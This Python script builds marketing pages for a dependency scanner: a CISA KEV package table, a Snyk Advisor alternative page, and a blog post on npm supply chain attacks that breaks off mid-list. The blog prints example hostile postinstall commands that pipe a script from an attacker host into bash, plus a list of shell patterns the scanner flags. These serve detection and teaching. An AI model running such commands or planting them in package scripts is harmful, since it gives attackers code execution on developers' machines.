#!/usr/bin/env python3
"""
PackageFix — Phase 4 SEO
1. CISA KEV master page (/cisa-kev)
2. Snyk Advisor alternative page (/snyk-advisor-alternative)
3. Node.js blog post (/blog/supply-chain-attacks-package-json)
"""

import os, json

BASE_URL = "https://packagefix.dev"

TOKENS = """
:root {
  --bg:#0B0D14; --surface:#12151F; --surface2:#1A1D2E;
  --border:#252836; --purple:#6C63FF; --green:#22C55E;
  --orange:#F97316; --red:#EF4444; --yellow:#EAB308;
  --text:#E2E4F0; --muted:#6B7280;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6;min-height:100vh}
a{color:var(--purple);text-decoration:none}
a:hover{text-decoration:underline}
.site-header{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:700;color:var(--text)}
.logo span{color:var(--purple)}
.nav-links{display:flex;gap:20px;font-size:12px}
.nav-links a{color:var(--muted)}
.nav-links a:hover{color:var(--text);text-decoration:none}
.container{max-width:860px;margin:0 auto;padding:48px 24px}
.container-wide{max-width:1000px;margin:0 auto;padding:48px 24px}
.breadcrumb{font-size:11px;color:var(--muted);margin-bottom:24px;display:flex;gap:6px;flex-wrap:wrap}
.breadcrumb a{color:var(--muted)}
h1{font-size:clamp(18px,3vw,28px);font-weight:700;margin-bottom:12px;line-height:1.3}
h2{font-size:15px;font-weight:600;margin:36px 0 12px}
h3{font-size:13px;font-weight:600;margin:24px 0 8px;color:var(--text)}
p{color:var(--muted);margin-bottom:12px;font-size:12px;line-height:1.7}
.lead{color:var(--text);font-size:13px;margin-bottom:24px;line-height:1.7}
.kev-banner{background:rgba(239,68,68,.12);border:1px solid var(--red);border-radius:10px;padding:16px 20px;margin:24px 0}
.kev-banner .label{font-size:10px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px}
.kev-banner p{color:var(--red);margin:0;font-size:12px}
pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:11px;line-height:1.6;margin:8px 0;white-space:pre-wrap}
code{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:1px 5px;font-size:11px}
.cta-box{background:var(--surface);border:1px solid var(--purple);border-radius:10px;padding:24px;margin:32px 0;text-align:center}
.cta-box p{color:var(--text);font-size:13px;margin-bottom:16px}
.cta-btn{display:inline-block;background:var(--purple);color:#fff;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;padding:12px 28px;border-radius:7px;text-decoration:none}
.cta-btn:hover{opacity:.9;text-decoration:none}
.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em}
.badge-red{background:rgba(239,68,68,.2);color:var(--red);border:1px solid var(--red)}
.badge-orange{background:rgba(249,115,22,.2);color:var(--orange);border:1px solid var(--orange)}
.badge-green{background:rgba(34,197,94,.2);color:var(--green);border:1px solid var(--green)}
.badge-purple{background:rgba(108,99,255,.2);color:var(--purple);border:1px solid var(--purple)}
.kev-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:12px}
.kev-table th{text-align:left;padding:10px 12px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.08em}
.kev-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
.kev-table tr:last-child td{border-bottom:none}
.kev-table tr:hover td{background:var(--surface2)}
.faq{margin:40px 0}
.faq-item{border-bottom:1px solid var(--border);padding:16px 0}
.faq-item:last-child{border-bottom:none}
.faq-q{font-size:12px;font-weight:600;color:var(--text);margin-bottom:8px}
.faq-a{font-size:12px;color:var(--muted);line-height:1.7}
.related-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:12px}
.related-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
.related-card a{color:var(--text);font-size:12px;font-weight:500}
.related-card p{font-size:11px;color:var(--muted);margin:4px 0 0}
.vs-row{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:20px 0}
.vs-col{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px}
.vs-col h3{margin:0 0 12px;font-size:12px}
.vs-col ul{padding-left:16px;color:var(--muted);font-size:12px;line-height:1.8}
.attack-card{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--red);border-radius:8px;padding:16px 20px;margin:20px 0}
.attack-card h3{color:var(--text);margin:0 0 8px;font-size:13px}
.attack-card p{margin:0;font-size:12px}
.blog-meta{color:var(--muted);font-size:11px;margin-bottom:32px;display:flex;gap:16px;flex-wrap:wrap}
.site-footer{border-top:1px solid var(--border);padding:24px;text-align:center;font-size:11px;color:var(--muted);margin-top:60px}
.site-footer a{color:var(--muted)}
@media(max-width:640px){.nav-links{display:none}.related-grid{grid-template-columns:1fr}.vs-row{grid-template-columns:1fr}}
"""

def shell(title, desc, canonical_path, breadcrumbs, body, schemas):
    canonical = BASE_URL + canonical_path
    schema_json = json.dumps({"@context":"https://schema.org","@graph":schemas}, indent=2)
    crumb_html = " <span style='color:var(--border)'>/</span> ".join(
        f'<a href="{u}">{n}</a>' if u else f'<span style="color:var(--text)">{n}</span>'
        for n,u in breadcrumbs
    )
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<meta name="description" content="{desc}">
<link rel="canonical" href="{canonical}">
<meta property="og:title" content="{title}">
<meta property="og:description" content="{desc}">
<meta property="og:url" content="{canonical}">
<meta property="og:type" content="{'article' if '/blog/' in canonical_path else 'website'}">
<meta name="twitter:card" content="summary">
<link rel="icon" type="image/svg+xml" href="/icon.svg">
<link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script type="application/ld+json">{schema_json}</script>
<style>{TOKENS}</style>
</head>
<body>
<header class="site-header">
  <a href="https://packagefix.dev" class="logo">Package<span>Fix</span></a>
  <nav class="nav-links">
    <a href="https://packagefix.dev">Tool</a>
    <a href="https://packagefix.dev/alternatives">Alternatives</a>
    <a href="https://packagefix.dev/cisa-kev">CISA KEV</a>
    <a href="https://packagefix.dev/error">Error Fixes</a>
    <a href="https://github.com/metriclogic26/packagefix">GitHub</a>
  </nav>
</header>
<main class="container">
  <div class="breadcrumb">{crumb_html}</div>
  {body}
</main>
<footer class="site-footer">
  <p>PackageFix · <a href="https://packagefix.dev">packagefix.dev</a> · MIT Licensed · Open Source</p>
  <p style="margin-top:6px">Part of the MetricLogic network ·
  <a href="https://configclarity.dev">ConfigClarity</a> ·
  <a href="https://domainpreflight.dev">DomainPreflight</a></p>
  <p style="margin-top:6px">Vulnerability data: <a href="https://osv.dev">OSV Database</a> · <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV Catalog</a></p>
  <p style="margin-top:6px">Always test dependency updates in a staging environment before deploying to production.</p>
</footer>
</body>
</html>"""

def cta():
    return """<div class="cta-box">
  <p>Scan your dependencies now — paste your manifest, get a fixed version back in seconds.</p>
  <a href="https://packagefix.dev" class="cta-btn">Open PackageFix →</a>
  <p style="margin-top:12px;font-size:11px;color:var(--muted)">No signup · No CLI · No GitHub · Runs 100% in your browser</p>
</div>"""

def faq_html(faqs):
    items = "".join(f'<div class="faq-item"><div class="faq-q">{q}</div><div class="faq-a">{a}</div></div>' for q,a in faqs)
    return f'<div class="faq"><h2>Frequently Asked Questions</h2>{items}</div>'

def write(slug, html):
    path = os.path.join("seo", slug, "index.html")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    all_paths.append("/" + slug)
    print(f"  ✓ /{slug}")

all_paths = []

# ══════════════════════════════════════════════════════════════════════════════
# PAGE 1 — CISA KEV MASTER PAGE
# ══════════════════════════════════════════════════════════════════════════════

KEV_PACKAGES = [
    # (ecosystem, package, cve_id, severity, description, fix_page)
    ("npm","lodash","CVE-2020-8203","HIGH","Prototype pollution via zipper merge","/fix/npm/lodash"),
    ("npm","qs","CVE-2022-24999","HIGH","Prototype pollution via query string","/fix/npm/qs"),
    ("npm","axios","CVE-2023-45857","HIGH","SSRF via protocol-relative URL","/fix/npm/axios"),
    ("npm","jsonwebtoken","CVE-2022-23540","CRITICAL","Algorithm confusion JWT forging","/fix/npm/jsonwebtoken"),
    ("npm","minimist","CVE-2021-44906","CRITICAL","Prototype pollution in args","/fix/npm/minimist"),
    ("npm","vm2","CVE-2023-29017","CRITICAL","Sandbox escape RCE","/fix/npm/vm2"),
    ("npm","sharp","CVE-2023-4863","CRITICAL","Heap buffer overflow (libwebp)","/fix/npm/sharp"),
    ("npm","follow-redirects","CVE-2023-26159","MEDIUM","URL redirect to untrusted site","/fix/npm/follow-redirects"),
    ("PyPI","PyYAML","CVE-2020-14343","CRITICAL","Arbitrary code via yaml.load()","/fix/pypi/PyYAML"),
    ("Ruby","rack","CVE-2023-27530","HIGH","DoS via multipart parsing","/fix/ruby/rack"),
    ("Ruby","omniauth","CVE-2015-9284","HIGH","CSRF via OAuth GET callback","/fix/ruby/omniauth"),
    ("PHP","dompdf","CVE-2021-3838","CRITICAL","RCE via CSS import URL","/fix/php/dompdf"),
    ("PHP","flysystem","CVE-2021-32708","CRITICAL","Path traversal arbitrary file read","/fix/php/flysystem"),
    ("Go","grpc","CVE-2023-44487","HIGH","HTTP/2 rapid reset DoS","/fix/go/grpc"),
    ("Go","net","CVE-2023-44487","HIGH","HTTP/2 rapid reset DoS","/fix/go/net"),
    ("Rust","openssl","CVE-2023-0286","CRITICAL","X.400 memory corruption","/fix/rust/openssl"),
    ("Rust","hyper","CVE-2023-44487","HIGH","HTTP/2 rapid reset DoS","/fix/rust/hyper"),
    ("Java","log4j","CVE-2021-44228","CRITICAL","Log4Shell — JNDI RCE","/fix/java/log4j"),
    ("Java","spring-core","CVE-2022-22965","CRITICAL","Spring4Shell — RCE data binding","/fix/java/spring-core"),
    ("Java","commons-text","CVE-2022-42889","CRITICAL","Text4Shell — RCE interpolation","/fix/java/commons-text"),
    ("Java","snakeyaml","CVE-2022-1471","CRITICAL","RCE via YAML deserialization","/fix/java/snakeyaml"),
    ("Java","commons-collections","CVE-2015-6420","CRITICAL","RCE via Java deserialization","/fix/java/commons-collections"),
    ("Java","jjwt","CVE-2022-21449","CRITICAL","ECDSA Psychic Signatures bypass","/fix/java/jjwt"),
    ("Java","netty","CVE-2023-44487","HIGH","HTTP/2 rapid reset DoS","/fix/java/netty"),
]

kev_rows = ""
for eco, pkg, cve, sev, desc, fix_page in KEV_PACKAGES:
    sev_class = "badge-red" if sev == "CRITICAL" else "badge-orange"
    kev_rows += f"""<tr>
  <td><a href="{fix_page}">{pkg}</a></td>
  <td><span class="badge badge-purple" style="font-size:9px">{eco}</span></td>
  <td><a href="https://osv.dev/vulnerability/{cve}" target="_blank" rel="noopener">{cve}</a></td>
  <td><span class="badge {sev_class}">{sev}</span></td>
  <td>{desc}</td>
  <td><a href="{fix_page}">Fix guide →</a></td>
</tr>"""

kev_faqs = [
    ("What is the CISA KEV catalog?","The CISA Known Exploited Vulnerabilities catalog lists vulnerabilities that are confirmed to be actively exploited in the wild. CISA mandates that US federal agencies remediate KEV entries within defined timeframes. All developers should treat KEV entries as immediate fix priorities."),
    ("How often does the CISA KEV catalog update?","The CISA KEV catalog updates daily. PackageFix checks the live catalog every scan — the data is always current. AI training data is always stale on KEV entries published after the training cutoff."),
    ("How do I check if my dependencies are on the CISA KEV list?","Paste your manifest file into PackageFix. Packages on the CISA KEV list are flagged with a red KEV badge in the CVE table and listed in the ACTIVELY EXPLOITED banner at the top of results."),
    ("What does it mean if my package is on the KEV list?","It means the vulnerability is being actively exploited in real attacks right now — not just theoretically possible. KEV packages should be patched immediately, before your next release cycle."),
    ("Which package managers have the most CISA KEV entries?","Java/Maven has the most KEV entries (Log4Shell, Spring4Shell, Text4Shell, Snakeyaml). npm has the second most (lodash, qs, vm2, jsonwebtoken). Both ecosystems should be audited regularly.")
]

kev_body = f"""
<h1>CISA Known Exploited Vulnerabilities — Open Source Packages</h1>
<p class="lead">Packages currently on the CISA KEV catalog that PackageFix can detect and fix. The CISA KEV catalog lists vulnerabilities confirmed to be actively exploited in the wild. Fix these first.</p>

<div class="kev-banner">
  <div class="label">🔴 Active Threat</div>
  <p>All packages below are on the <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" style="color:var(--red)">CISA Known Exploited Vulnerabilities catalog</a>. These are not theoretical risks — they are being exploited in real attacks right now. US federal agencies are mandated to remediate these immediately.</p>
</div>

<h2>Exploited Open Source Packages ({len(KEV_PACKAGES)} packages)</h2>
<table class="kev-table">
  <thead>
    <tr>
      <th>Package</th>
      <th>Ecosystem</th>
      <th>CVE ID</th>
      <th>Severity</th>
      <th>Description</th>
      <th>Fix</th>
    </tr>
  </thead>
  <tbody>{kev_rows}</tbody>
</table>

{cta()}

<h2>Why CISA KEV Matters for Developers</h2>
<p>The CVE database contains tens of thousands of vulnerabilities. Most will never be exploited. CISA KEV is different — it's a curated list of vulnerabilities that threat actors are actively using in real attacks against real systems. A package on this list is not a theoretical risk.</p>
<p>PackageFix checks the live CISA KEV catalog on every scan. The catalog updates daily — CVEs added yesterday are reflected immediately. This is the hardest moat in dependency scanning: the data is always newer than any AI training dataset.</p>

<h2>The Highest-Risk Entries</h2>

<div class="attack-card">
  <h3>🔴 Log4Shell (CVE-2021-44228) — Apache Log4j — CRITICAL</h3>
  <p>Remote code execution via JNDI lookup in log messages. Affected virtually every Java application logging with Log4j 2.x. Still being exploited 3+ years after disclosure. <a href="/fix/java/log4j">Fix guide →</a></p>
</div>

<div class="attack-card">
  <h3>🔴 Spring4Shell (CVE-2022-22965) — Spring Framework — CRITICAL</h3>
  <p>Remote code execution via data binding with Spring MVC on Java 9+. Affected the majority of Spring Boot applications. <a href="/fix/java/spring-core">Fix guide →</a></p>
</div>

<div class="attack-card">
  <h3>🔴 Text4Shell (CVE-2022-42889) — Apache Commons Text — CRITICAL</h3>
  <p>Remote code execution via string interpolation. Similar attack surface to Log4Shell. Any application using StringSubstitutor is affected. <a href="/fix/java/commons-text">Fix guide →</a></p>
</div>

<div class="attack-card">
  <h3>🔴 HTTP/2 Rapid Reset (CVE-2023-44487) — Multiple packages — HIGH</h3>
  <p>Denial of service via HTTP/2 rapid reset attack. Affects grpc-go, golang.org/x/net, Netty, hyper (Rust), and any framework built on these. <a href="/fix/go/grpc">Fix guide →</a></p>
</div>

{faq_html(kev_faqs)}

<div style="margin:40px 0">
  <h2>Related Guides</h2>
  <div class="related-grid">
    <div class="related-card"><a href="/fix/java/log4j">Fix Log4Shell (CVE-2021-44228)</a><p>Apache Log4j RCE fix</p></div>
    <div class="related-card"><a href="/fix/java/spring-core">Fix Spring4Shell (CVE-2022-22965)</a><p>Spring Framework RCE fix</p></div>
    <div class="related-card"><a href="/fix/java/commons-text">Fix Text4Shell (CVE-2022-42889)</a><p>Commons Text RCE fix</p></div>
    <div class="related-card"><a href="/fix/npm/lodash">Fix Lodash CVE-2020-8203</a><p>Prototype pollution fix</p></div>
    <div class="related-card"><a href="/npm">npm Security Overview</a><p>All npm vulnerability guides</p></div>
    <div class="related-card"><a href="/java">Java Security Overview</a><p>All Java vulnerability guides</p></div>
  </div>
</div>
"""

kev_schemas = [
    {"@type":"ItemList","name":"CISA KEV Open Source Packages",
     "description":"Open source packages on the CISA Known Exploited Vulnerabilities catalog",
     "itemListElement":[
         {"@type":"ListItem","position":i+1,"name":f"{pkg} — {cve}","url":BASE_URL+fix}
         for i,(_,pkg,cve,_,_,fix) in enumerate(KEV_PACKAGES)
     ]},
    {"@type":"BreadcrumbList","itemListElement":[
        {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
        {"@type":"ListItem","position":2,"name":"CISA KEV","item":BASE_URL+"/cisa-kev"}
    ]},
    {"@type":"FAQPage","mainEntity":[
        {"@type":"Question","name":q,"acceptedAnswer":{"@type":"Answer","text":a}}
        for q,a in kev_faqs
    ]}
]

write("cisa-kev", shell(
    "CISA KEV Open Source Packages — Actively Exploited Dependencies | PackageFix",
    "Open source packages on the CISA Known Exploited Vulnerabilities catalog. Log4Shell, Spring4Shell, lodash, qs, and more — being actively exploited right now. Fix guides for all 7 ecosystems.",
    "/cisa-kev",
    [("PackageFix","/"),("CISA KEV",None)],
    kev_body, kev_schemas
))

# ══════════════════════════════════════════════════════════════════════════════
# PAGE 2 — SNYK ADVISOR ALTERNATIVE
# ══════════════════════════════════════════════════════════════════════════════

snyk_faqs = [
    ("What happened to Snyk Advisor?","Snyk Advisor shut down in January 2026. The product provided browser-based package health scores and CVE checking without a CLI or GitHub connection. Snyk did not announce a direct replacement — users were directed to the main Snyk platform which requires GitHub access."),
    ("What is the best Snyk Advisor alternative?","PackageFix is the closest browser-based alternative. Paste your manifest file (package.json, requirements.txt, Gemfile, composer.json, go.mod, Cargo.toml, or pom.xml) and get back a CVE table, CISA KEV flags, and a downloadable fixed manifest. No signup, no CLI, no GitHub connection."),
    ("Does PackageFix require a GitHub connection like Snyk?","No. PackageFix runs entirely in your browser. Paste any manifest file directly — no GitHub, no account, no CLI install. Your files never leave your device."),
    ("Does PackageFix support the same ecosystems as Snyk Advisor?","PackageFix supports 7 ecosystems: npm, PyPI (Python), Ruby (Gemfile), PHP (Composer), Go (go.mod), Rust (Cargo.toml), and Java/Maven (pom.xml). Snyk Advisor only covered npm and PyPI before shutting down."),
    ("Is PackageFix free like Snyk Advisor was?","Yes — PackageFix is completely free, MIT licensed, and open source. No paid tier, no credit card, no feature limits."),
    ("What does PackageFix have that Snyk Advisor didn't?","PackageFix generates the fixed manifest file to download — Snyk Advisor was a checker only. PackageFix also adds CISA KEV flags, supply chain attack detection (Glassworm/Unicode injection, typosquatting, zombie packages), and supports 5 more ecosystems.")
]

snyk_body = f"""
<h1>Snyk Advisor Alternative — Free Browser-Based Dependency Scanner</h1>
<p class="lead">Snyk Advisor shut down in January 2026. PackageFix is the free, browser-based replacement — paste your manifest, get a fixed version back. No signup, no CLI, no GitHub connection.</p>

<div class="kev-banner" style="background:rgba(249,115,22,.08);border-color:var(--orange)">
  <div class="label" style="color:var(--orange)">⚠ Snyk Advisor Status</div>
  <p style="color:var(--orange)">Snyk Advisor was permanently shut down in January 2026. The URL now redirects to the main Snyk platform which requires GitHub repository access. The browser paste-and-check experience no longer exists at Snyk.</p>
</div>

<h2>What Snyk Advisor Did</h2>
<p>Snyk Advisor provided package health scores, CVE lists, and maintenance status for npm and PyPI packages — all in a browser with no login required. It was the go-to tool for developers who wanted a quick dependency health check without setting up a full pipeline.</p>
<p>PackageFix was built to fill this gap — and goes further by generating the fixed manifest file.</p>

<h2>PackageFix vs Snyk Advisor</h2>
<div class="vs-row">
  <div class="vs-col">
    <h3 style="color:var(--green)">✅ PackageFix (Live)</h3>
    <ul>
      <li>Browser-based — paste and go</li>
      <li>No signup, no GitHub, no CLI</li>
      <li>7 ecosystems: npm, PyPI, Ruby, PHP, Go, Rust, Java</li>
      <li>Downloads the fixed manifest</li>
      <li>CISA KEV flags — actively exploited packages</li>
      <li>Supply chain attack detection</li>
      <li>Side-by-side diff</li>
      <li>MIT licensed, open source</li>
    </ul>
  </div>
  <div class="vs-col">
    <h3 style="color:var(--red)">❌ Snyk Advisor (Dead)</h3>
    <ul>
      <li>Shut down January 2026</li>
      <li>Was browser-based</li>
      <li>npm + PyPI only</li>
      <li>Checker only — no fix output</li>
      <li>No CISA KEV integration</li>
      <li>No supply chain detection</li>
      <li>No diff view</li>
      <li>Proprietary</li>
    </ul>
  </div>
</div>

<h2>How to Migrate from Snyk Advisor</h2>
<p>If you were using Snyk Advisor for quick package health checks, the migration is immediate:</p>
<ol style="padding-left:20px;margin:12px 0 20px;color:var(--muted);font-size:12px;line-height:2">
  <li>Go to <a href="https://packagefix.dev">packagefix.dev</a></li>
  <li>Paste your package.json, requirements.txt, Gemfile, or other manifest</li>
  <li>Click Scan — get CVE table, CISA KEV flags, and severity badges</li>
  <li>Download the fixed manifest with all patches applied</li>
</ol>
<p>No account creation. No GitHub connection. No CLI install. The entire workflow is faster than Snyk Advisor was.</p>

{cta()}

<h2>Other Snyk Advisor Alternatives</h2>
<p>If PackageFix doesn't meet your needs, here are other options — each with trade-offs:</p>

<table class="kev-table">
  <thead><tr><th>Tool</th><th>Browser?</th><th>Fix output?</th><th>Free?</th><th>Note</th></tr></thead>
  <tbody>
    <tr><td><strong>PackageFix</strong></td><td>✅ Yes</td><td>✅ Yes</td><td>✅ Free</td><td>Closest replacement</td></tr>
    <tr><td>Dependabot</td><td>❌ GitHub bot</td><td>⚠ PRs only</td><td>✅ Free</td><td>Requires GitHub</td></tr>
    <tr><td>npm audit</td><td>❌ CLI only</td><td>❌ Report</td><td>✅ Free</td><td>npm only</td></tr>
    <tr><td>pip-audit</td><td>❌ CLI only</td><td>❌ Report</td><td>✅ Free</td><td>PyPI only</td></tr>
    <tr><td>OSV-Scanner</td><td>❌ CLI only</td><td>❌ Report</td><td>✅ Free</td><td>Google, multi-ecosystem</td></tr>
    <tr><td>Snyk (main)</td><td>❌ No</td><td>⚠ PRs only</td><td>⚠ Limited</td><td>Requires GitHub</td></tr>
  </tbody>
</table>

{faq_html(snyk_faqs)}

<div style="margin:40px 0">
  <h2>Related</h2>
  <div class="related-grid">
    <div class="related-card"><a href="/vs/snyk-advisor">PackageFix vs Snyk Advisor</a><p>Full feature comparison</p></div>
    <div class="related-card"><a href="/vs/dependabot">PackageFix vs Dependabot</a><p>No GitHub required</p></div>
    <div class="related-card"><a href="/alternatives">All Alternatives</a><p>16-tool comparison table</p></div>
    <div class="related-card"><a href="/npm">npm Security Guide</a><p>npm vulnerability scanning</p></div>
  </div>
</div>
"""

snyk_schemas = [
    {"@type":"BreadcrumbList","itemListElement":[
        {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
        {"@type":"ListItem","position":2,"name":"Snyk Advisor Alternative","item":BASE_URL+"/snyk-advisor-alternative"}
    ]},
    {"@type":"FAQPage","mainEntity":[
        {"@type":"Question","name":q,"acceptedAnswer":{"@type":"Answer","text":a}}
        for q,a in snyk_faqs
    ]},
    {"@type":"Article",
     "headline":"Snyk Advisor Alternative — Free Browser-Based Dependency Scanner",
     "description":"Snyk Advisor shut down January 2026. PackageFix is the free browser-based replacement.",
     "datePublished":"2026-03-22","dateModified":"2026-03-22",
     "author":{"@type":"Organization","name":"MetricLogic","url":"https://packagefix.dev"}}
]

write("snyk-advisor-alternative", shell(
    "Snyk Advisor Alternative — Free Browser Dependency Scanner | PackageFix",
    "Snyk Advisor shut down January 2026. PackageFix is the free browser-based alternative — paste your manifest, get a fixed version back. No signup, no CLI, no GitHub. 7 ecosystems.",
    "/snyk-advisor-alternative",
    [("PackageFix","/"),("Snyk Advisor Alternative",None)],
    snyk_body, snyk_schemas
))

# ══════════════════════════════════════════════════════════════════════════════
# PAGE 3 — NODE.JS BLOG POST
# ══════════════════════════════════════════════════════════════════════════════

blog_faqs = [
    ("Does npm audit catch supply chain attacks?","npm audit only checks CVE databases. It does not detect typosquatting, Unicode injection in scripts, zombie packages with sudden updates, or packages where a maintainer account was compromised. PackageFix adds these checks on top of OSV CVE scanning."),
    ("What is a Glassworm attack?","Glassworm is a supply chain attack technique that embeds invisible Unicode characters (zero-width spaces, variation selectors) in package.json scripts. The script looks clean in a text editor but contains hidden payloads that execute on install. PackageFix detects these by scanning manifest content for non-printable Unicode ranges."),
    ("How do I detect a compromised npm package?","Look for packages that were dormant for 12+ months and then suddenly received an update. This is the fingerprint of a compromised maintainer account. PackageFix flags npm packages that have a long inactivity gap followed by a recent publish."),
    ("What is typosquatting in npm?","Typosquatting is registering a package name one character away from a popular package — 'expres' instead of 'express', 'lodas' instead of 'lodash'. Developers who mistype the package name in npm install end up installing the malicious package. PackageFix checks all package names against a Levenshtein distance of 1 from the top 100 npm packages."),
    ("What is the CISA KEV catalog?","The CISA Known Exploited Vulnerabilities catalog lists vulnerabilities confirmed to be actively exploited in real attacks. npm packages on this list (lodash, qs, jsonwebtoken, vm2) should be treated as critical-priority fixes regardless of your usual patch schedule.")
]

blog_body = f"""
<h1>5 Supply Chain Attacks Hiding in Your package.json Right Now</h1>
<div class="blog-meta">
  <span>March 22, 2026</span>
  <span>·</span>
  <span>MetricLogic / PackageFix</span>
  <span>·</span>
  <span>8 min read</span>
</div>

<p class="lead">npm audit tells you about CVEs. It doesn't tell you about the package that went dormant for 14 months and just pushed an update. It doesn't tell you about the invisible Unicode character in your postinstall script. It doesn't tell you that one of your dependencies is one character away from a known malware package. Here's what npm audit misses — and how to detect it.</p>

<h2>1. Glassworm — Invisible Unicode in Your Scripts</h2>

<div class="attack-card">
  <h3>Attack type: Script injection · Detection: PackageFix Unicode scan</h3>
  <p>A compromised package embeds invisible Unicode characters (zero-width spaces, variation selectors U+FE00–U+FE0F) in npm scripts. The script looks clean in your editor. To the shell, it contains a hidden payload.</p>
</div>

<p>This is not theoretical. The Glassworm campaign (March 2026) actively used Unicode variation selectors in npm postinstall scripts. The attack is invisible to code review because most editors either don't render these characters or render them identically to their visible equivalents.</p>

<p>What your package.json looks like in your editor:</p>
<pre>"postinstall": "node setup.js"</pre>

<p>What it actually contains (revealed in a hex editor):</p>
<pre>"postinstall": "node\u200B setup.js && curl https://attacker.com/payload.sh | bash"</pre>

<p>The zero-width space (U+200B) is invisible. The shell executes the entire string.</p>

<p><strong>How to detect it:</strong> Paste your package.json into PackageFix. It scans all manifest content for invisible Unicode ranges before parsing. If found, a red banner appears: "Invisible Unicode characters detected — do not use this manifest."</p>

<h2>2. The Zombie Package — Dormant Then Suddenly Updated</h2>

<div class="attack-card">
  <h3>Attack type: Compromised maintainer · Detection: PackageFix suspicious package flag</h3>
  <p>A package hasn't been updated in 18 months. The maintainer's npm account gets compromised. A malicious version is published. The package has millions of weekly downloads. Every project that runs npm install gets the payload.</p>
</div>

<p>This is how the event-stream attack worked in 2018. The maintainer handed off the package to a stranger who published a malicious version. In 2024–2026, this attack pattern has accelerated — compromised maintainer accounts are actively targeted because they provide instant distribution to millions of installs.</p>

<p>npm audit won't flag this. The malicious version may have no CVE yet — CVEs are assigned after discovery, not before. By the time a CVE is assigned, the attack has already run on thousands of machines.</p>

<p><strong>How to detect it:</strong> PackageFix fetches the npm registry's time.modified and version history for each package. If a package was dormant for more than 24 months and received an update within the last 72 hours with more than 100,000 weekly downloads, it's flagged with a 🧟 ZOMBIE badge: "Updated 4 hours ago after 18 months of inactivity. May indicate a compromised maintainer account."</p>

<h2>3. Typosquatting — One Character Away from Disaster</h2>

<div class="attack-card">
  <h3>Attack type: Package name confusion · Detection: PackageFix Levenshtein check</h3>
  <p>An attacker registers "expres" on npm. A developer types npm install expres (missing the s). The malicious package installs. postinstall runs. Credentials exfiltrated.</p>
</div>

<p>Typosquatting attacks on npm are continuous. The npm registry has no automatic protection against names that are one character away from popular packages. Every year, security researchers discover hundreds of typosquatted packages — many with postinstall scripts that exfiltrate environment variables.</p>

<p>Common targets: express → expres, lodash → lodas, react → reacts, webpack → webpak, axios → axois.</p>

<p><strong>How to detect it:</strong> PackageFix runs a Levenshtein distance check against a hardcoded list of the top 100 npm packages for every dependency name in your manifest. A distance of 1 triggers a ⚠ TYPOSQUAT? badge: "Similar to express — verify this is the correct package."</p>

<h2>4. Build Script Injection — curl in Your postinstall</h2>

<div class="attack-card">
  <h3>Attack type: Arbitrary code execution · Detection: PackageFix build script scan</h3>
  <p>A dependency's postinstall script contains curl https://example.com/setup.sh | bash. This runs automatically when you npm install. You never see it unless you read every package's package.json in node_modules.</p>
</div>

<p>Legitimate packages sometimes use postinstall scripts (native module compilation, binary downloads). Malicious packages use them for code execution. The difference isn't always obvious from the package name or description.</p>

<p>npm does not warn you when a postinstall script contains network calls. npm install just runs it.</p>

<p><strong>How to detect it:</strong> PackageFix scans all scripts fields in your package.json for dangerous patterns: curl, wget, sh -c, bash -c, python -c, eval. If found, an orange banner appears: "Build script contains network or shell commands — review before proceeding" with the exact script content shown.</p>

<h2>5. The CISA KEV Package — Actively Exploited Right Now</h2>

<div class="attack-card">
  <h3>Attack type: Known CVE exploitation · Detection: PackageFix CISA KEV flag</h3>
  <p>Your package.json has lodash 4.17.15. CVE-2020-8203 (prototype pollution) is in the CISA Known Exploited Vulnerabilities catalog — meaning it's being used in real attacks against real systems right now. npm audit flags it as HIGH. What npm audit doesn't tell you: this one is in the wild.</p>
</div>

<p>The CVE database contains tens of thousands of vulnerabilities. The CISA KEV catalog contains the ones that are actually being exploited. The distinction matters for prioritization — you can't fix everything immediately, but you should fix the KEV entries immediately.</p>

<p>npm packages on the current CISA KEV list: lodash, qs, jsonwebtoken, minimist, vm2, axios, follow-redirects, sharp.</p>

<p><strong>How to detect it:</strong> PackageFix checks every scanned package against the live CISA KEV catalog. KEV packages get a red 🔴 dot in the CVE table and appear in the ACTIVELY EXPLOITED banner at the top of results.</p>

<h2>How to Check Your package.json Right Now</h2>

<p>All 5 attack vectors are checked automatically when you paste your package.json into PackageFix:</p>
<ol style="padding-left:20px;margin:12px 0 20px;color:var(--muted);font-size:12px;line-height:2">
  <li>Open <a href="https://packagefix.dev">packagefix.dev</a></li>
  <li>Paste your package.json (drop package-lock.json too for transitive scanning)</li>
  <li>Click Scan Dependencies</li>
